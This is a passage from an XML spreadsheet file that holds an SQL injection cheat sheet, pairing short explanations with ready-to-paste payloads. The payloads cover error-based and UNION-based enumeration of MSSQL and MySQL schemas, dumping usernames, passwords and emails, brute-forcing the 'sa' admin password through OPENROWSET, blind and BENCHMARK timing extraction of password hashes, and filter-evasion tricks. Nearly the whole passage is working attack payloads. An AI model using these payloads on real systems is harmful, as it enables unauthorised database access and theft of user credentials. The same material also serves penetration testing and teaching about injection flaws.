            <text:p>SELECT name FROM master..sysdatabases T1 WHERE ((SELECT COUNT(*) FROM master..sysdatabases T2 WHERE T2.name &amp;lt;= T1.name) = $XX$)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>or you can use this way (I know, someone will think 2 top should be enough, but sometimes it gives trouble, with 3 top no… don’t ask me why… hey Lame! it’s your query!):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT TOP 1 name FROM (SELECT TOP 1 name FROM (SELECT TOP $XX$ name FROM master..sysdatabases ORDER BY name ASC) as foo ORDER by name DESC) as foo ORDER by name DESC</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro14">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>You can test this syntax with (“or 1 in” on the first query will return always the same result, so we will use “or 1 =”):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 = (SELECT name FROM master..sysdatabases T1 WHERE ((SELECT COUNT(*) FROM master..sysdatabases T2 WHERE T2.name &amp;lt;= T1.name) = $XX$)) -- </text:p>
            <text:p>' or 1 in (SELECT TOP 1 name FROM (SELECT TOP 1 name FROM (SELECT TOP $XX$ name FROM master..sysdatabases ORDER BY name ASC) as foo ORDER by name DESC) as foo ORDER by name DESC)--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>To get numeric data we need to convert them to strings and append a non numeric char, otherwise the sql server will do an automatic cast.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select CONVERT(varchar(255),dbid)+'$' from master..sysdatabases) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>and we can append data to get results faster</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 = (SELECT CONVERT(varchar(255),dbid)+'$'+name FROM master..sysdatabases T1 WHERE ((SELECT COUNT(*) FROM master..sysdatabases T2 WHERE T2.name &amp;lt;= T1.name) = $XX$)) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Ok, now we have to get the tables name, columns etc. We will work on the current database, but you can access to the others with a double dot syntax, like “master..sysdatabases”. This query will return you all the primary keys of all tables names, column names and column type (string, boolean, int).</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT T1.name AS Tablename, T2.name AS Columnname, T2.xtype AS Columntype</text:p>
            <text:p>FROM sysobjects T1, syscolumns T2 </text:p>
            <text:p>WHERE (T1.id = T2.id) AND (T1.xtype = 'U' OR T1.xtype = 'V') AND (T2.colid  IN (SELECT keyno FROM sysindexkeys WHERE T1.id = id AND T2.colid = keyno))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>and this one will return all non primary keys.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT T1.name AS Tablename, T2.name AS Columnname, T2.xtype AS Columntype</text:p>
            <text:p>FROM sysobjects T1, syscolumns T2 </text:p>
            <text:p>WHERE (T1.id = T2.id) AND (T1.xtype = 'U' OR T1.xtype = 'V') AND (T2.colid  NOT IN (SELECT keyno FROM sysindexkeys WHERE T1.id = id AND T2.colid = keyno))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>So you can build the database structures using this query:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT  Tablename+'$'+Columnname+'$'+CONVERT(varchar(255),Columntype)</text:p>
            <text:p>FROM ( </text:p>
            <text:p>SELECT T1.name AS Tablename, T2.name AS Columnname, T2.xtype AS Columntype, T2.id AS id </text:p>
            <text:p>FROM sysobjects T1 INNER JOIN syscolumns T2 ON T1.id = T2.id </text:p>
            <text:p>WHERE ( (</text:p>
            <text:p>T1.xtype = 'U' OR T1.xtype = 'V') AND </text:p>
            <text:p>(T2.colid IN ( </text:p>
            <text:p>SELECT keyno </text:p>
            <text:p>FROM sysindexkeys </text:p>
            <text:p>WHERE T1.id = id AND T2.colid = keyno </text:p>
            <text:p>)) </text:p>
            <text:p>)</text:p>
            <text:p>) T4</text:p>
            <text:p>WHERE (( </text:p>
            <text:p>SELECT COUNT(*)</text:p>
            <text:p>FROM (</text:p>
            <text:p>SELECT T7.name AS Tablename, T8.name AS Columnname, T8.xtype AS Columntype, T8.id AS id </text:p>
            <text:p>FROM sysobjects T7 INNER JOIN syscolumns T8 ON T7.id = T8.id WHERE (     </text:p>
            <text:p>(T7.xtype = 'U' OR T7.xtype = 'V') </text:p>
            <text:p>AND (T8.colid IN (      </text:p>
            <text:p>SELECT keyno </text:p>
            <text:p>FROM sysindexkeys </text:p>
            <text:p>WHERE T7.id = id AND T8.colid = keyno </text:p>
            <text:p>)) </text:p>
            <text:p>) </text:p>
            <text:p>) T5 </text:p>
            <text:p>WHERE (CONVERT(varchar(255), T5.id) + T5.columnname &amp;lt;= CONVERT(varchar(255), T4.id) + T4.columnname) </text:p>
            <text:p>) = 3</text:p>
            <text:p>)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro17">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>or using this (simple) one:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT     CONVERT(varchar(255), T1.name) + '$' + CONVERT(varchar(255), T2.name) + '$' + CONVERT(varchar(255), T2.xtype) AS Expr1</text:p>
            <text:p>FROM         sysobjects T1 INNER JOIN                      syscolumns T2 ON T1.id = T2.id</text:p>
            <text:p>WHERE     (T1.xtype = 'U' OR</text:p>
            <text:p>                      T1.xtype = 'V') AND (T2.colid IN</text:p>
            <text:p>                          (SELECT     keyno</text:p>
            <text:p>                            FROM          sysindexkeys</text:p>
            <text:p>                            WHERE      T1.id = id AND T2.colid = keyno))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Now we can download the primary keys columns ($XX$ is the number of the row) the $ will be the deliminator</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in ( SELECT TOP 1 pippo FROM(SELECT TOP 1 pippo FROM ( SELECT TOP $XX$ convert(varchar(255),T1.name)+'$'+convert(varchar(255),T2.name)+'$'+convert(varchar(255),T2.xtype) as pippo FROM sysobjects T1 INNER JOIN syscolumns T2 ON T1.id = T2.id WHERE (T1.xtype = 'U' OR T1.xtype = 'V') AND (T2.colid IN (SELECT keyno FROM sysindexkeys WHERE T1.id = id AND T2.colid = keyno)) ORDER BY pippo ASC) as pippo ORDER by pippo DESC) as pippo ORDER by pippo DESC ) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>and the other columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in ( SELECT TOP 1 pippo FROM(SELECT TOP 1 pippo FROM ( SELECT TOP $XX$ convert(varchar(255),T1.name)+'$'+convert(varchar(255),T2.name)+'$'+convert(varchar(255),T2.xtype) as pippo FROM sysobjects T1 INNER JOIN syscolumns T2 ON T1.id = T2.id WHERE (T1.xtype = 'U' OR T1.xtype = 'V') AND (T2.colid NOT IN (SELECT keyno FROM sysindexkeys WHERE T1.id = id AND T2.colid = keyno)) ORDER BY pippo ASC) as pippo ORDER by pippo DESC) as pippo ORDER by pippo DESC ) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Ok… now you have all the database structure of the current database.</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.3 – Dumping the data</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>If you have the database structure, it is simple to get the data. For example if we have a table named “users” with primary key “userid” (numeric) and with columns username,userpass,usermail you can get single data with:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select '$'+convert(varchar(255),username) from users where userid = $XX$) -- </text:p>
            <text:p>' or 1 in (select '$'+convert(varchar(255),userpass) from users where userid = $XX$) -- '</text:p>
            <text:p> or 1 in (select '$'+convert(varchar(255),usermail) from users where userid = $XX$) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>or you can get it on a single query with:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select '$'+convert(varchar(255),username)+'$'+convert(varchar(255),userpass)+'$'+convert(varchar(255),usermail)from users where userid = $XX$) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>If you wouldn’t use a where condition (if you don’t know how many record there will be, or if you don’t know the primary keys) you can always use the top method as:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in ( SELECT TOP 1 pippo FROM(SELECT TOP 1 pippo FROM ( SELECT TOP $XX$ '$'+convert(varchar(255),username)+'$'+convert(varchar(255),userpass)+'$'+convert(varchar(255),usermail) as pippo from users ORDER BY pippo ASC) as pippo ORDER by pippo DESC) as pippo ORDER by pippo DESC ) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>using UNION SELECT and increase the number of columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1’ UNION SELECT 1,version@@,3,4 –</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>UNION list of tables</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>UNION list of columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Concat 2 columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION SELECT 1,concat(table_name,’:’,column_name),3,4 FROM information_schema.columns</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>using ORDER BY</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT firstname,lastname,age,groups FROM users ORDER BY firstname</text:p>
            <text:p>SELECT firstname,lastname,age,groups FROM users ORDER BY 3</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>show tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 or 1=1; SHOW TABLES;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>show tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 or 1=1; SELECT host,user,db from mysql.db</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Table mapping</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT COUNT(*) FROM tablename</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Field mapping</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM tablename WHERE user LIKE “%root%”</text:p>
            <text:p>SELECT * FROM tablename WHERE user LIKE “%”;</text:p>
            <text:p>SELECT * FROM tablename WHERE user = ‘root’ AND id IS NOT NULL;</text:p>
            <text:p>SELECT * FROM tablename WHERE user = ‘x’ AND id IS NULL;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>User mapping</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM tablename WHERE email = ‘<text:a xlink:href="mailto:user@site.com" xlink:type="simple">user@site.com</text:a>’;</text:p>
            <text:p>SELECT * FROM tablename WHERE user LIKE “%root%”;</text:p>
            <text:p>SELECT * FROM tablehwere WHERE user = ‘username’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.4 – Privilege escalation with OPENROWSET</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select * from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select 1')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>A query can be done with normal users privileges, but sometimes you need administrator privileges (for example to use xp_cmdshell) or get access to others databases. On SQL SERVER 2000 you can use the OPENROWSET to bruteforce the admin password (on SQL SERVER 2005 it has been disabled by default) with a query like this one</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select name from master..sysusers where uid =0')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>If “Login failed for user ‘sa'” appears the login is incorrect, otherwise you found the password. With a query like thisone you can get data of other databases:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select name from master..sysusers where uid =''0''')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Remember the escape character in MSSQL is ” so, if you need some ‘ on the query in the openrowset you need to use them double like:</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p> </text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>2 – Blind sql injection</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>2.a Feel around</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>First of all you have to identify a way to get different results with injecting your data, for example:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 and 1=1 –</text:p>
            <text:p>1 and 1=2 –</text:p>
            <text:p>1 &amp;&amp; 1;</text:p>
            <text:p>1 || 1;</text:p>
            <text:p>1 XOR 0;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Another interesting way can be use sql optimizations to get an error if the last part of the query is correct.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 and 1 in (select @@version) and 1=1 –</text:p>
            <text:p>1 and 1 in (select @@version) and 1=2 --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>More blind SQL Injection by attempting to create an error using the backslash method seen above:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1\'1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Evading escapes with backslashes (this assumes the application comments out a single quote with another single quote and by introducing a backslash before it, it comments out the singlequote that is added by the filter). This type of filter is applied by mySQL's mysql_real_escape_string() and PERL's DBD method $dbh→quote():</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>\'; DESC users; –</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Bypassing filter evasion using comment tags:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNI/**/ON SELECT ALL FROM WHERE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Dumping usernames (assuming there is a username table and quotes are not escaped):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' OR username IS NOT NULL OR username = '</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Finding user supplied tables using the sysObjects table in SQL Server:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Blind check privs</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1′ AND MID((SELECT file_priv FROM mysql.user WHERE user = ‘username’),1,1) = ‘Y</text:p>
            <text:p/>
            <text:p>1′ AND MID((SELECT is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%username%’),1,1)=’Y</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>2.c Brute</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Having this kind of difference between the results gives you a way to work with a blind sql injection. Another way can be using WAIT and similar instructions of the db, but to get the results you will spend a lot of time.</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>To get the data using this response differences we can use the keyword like:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'm%')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro20">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>If the page will return a non blank result the table sysdatabases columns names contains a record that starts with the letter M. Now you can implement a little brute force tool to get all the names.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'm%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'ma%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'mas%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'mast%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'maste%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'master%')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro11">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>The choice of the charset for the bruteforce attack can cause a lot of problems. You will not be sure to get all the data because you don’t know what type the data is. By using the stored procedure <text:a xlink:href="http://ticwebguys.xwiki.com/xwiki/bin/view/Main/FnVarbintohexstr" xlink:type="simple">fn_varbintohexstr</text:a> you can convert the data in a hex value, so you will know the charset is “abcdef01234567890”.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 AND (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6%')) –</text:p>
            <text:p>1 AND (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6d%')) –</text:p>
            <text:p>1 AND (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6d006%')) –</text:p>
            <text:p>1 AND (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6d0061%')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Blind SQL Injection to attempt to locate tablenames by brute force iteration through potential names (you'll have to rename tablenames until you find a match):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1' AND 1=(SELECT COUNT(*) FROM tablenames); --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Enumerating through database table names. By changing the 116 to different numbers you can use logrithmic reduction to find the first char of the database table name. Then iterating through the first 1 in 1, 1 you can eventually get the whole table name. Originally found by <text:a xlink:href="https://web.archive.org/web/20150420183409/http://www.spidynamics.com/whitepapers/Blind_SQLInjection.pdf" xlink:type="simple">Kevin Spett</text:a>:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) &gt; 116</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Extract hashes using BENCHMARK, (one char at a time)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user FROM login WHERE user = ‘root’ UNION SELECT IF(SUBSTRING(passwordfield,1,1) = CHAR(97), BENCHMARK(1000000,MD5('x')),null) FROM login;</text:p>
            <text:p>SELECT user FROM login WHERE user = 'root’ UNION SELECT IF(SUBSTRING(passwordfield,1,2) = CHAR(97,97),</text:p>
            <text:p>BENCHMARK(1000000,MD5('x')),null) FROM login</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract hashes using BENCHMARK CHAR encoded</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user FROM login WHERE user =</text:p>
            <text:p>CONCAT(CHAR(39),CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110),CHAR( 39))</text:p>
            <text:p>UNION SELECT IF(SUBSTRING(pass,1,2) = CHAR(97,97),</text:p>
            <text:p>BENCHMARK(1000000,MD5(CHAR(59))),null) FROM login</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>As described with the standard sql injection you can get table structures and data. So build your own sql blind bruteforce script.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="3">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p> </text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>3 – Compatibility issues</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1' ; use master; select * from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select 1') --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>During some pentest I got some strange error on the syntax of the injections, I discovered that there was some compatibilty issues on the software set with <text:a xlink:href="http://msdn2.microsoft.com/en-us/library/ms178653.aspx" xlink:type="simple">sp_dbcmptlevel</text:a>. To avoid these limits you just need to change the database and work as with blind sql injections.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>4 – Escape errors</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>a';SET QUOTED_IDENTIFIER OFF;select * FROM OPENROWSET("SQLOLEDB","";"sa";"password","SELECT 1");--</text:p>
          </table:table-cell>
        </table:table-row>
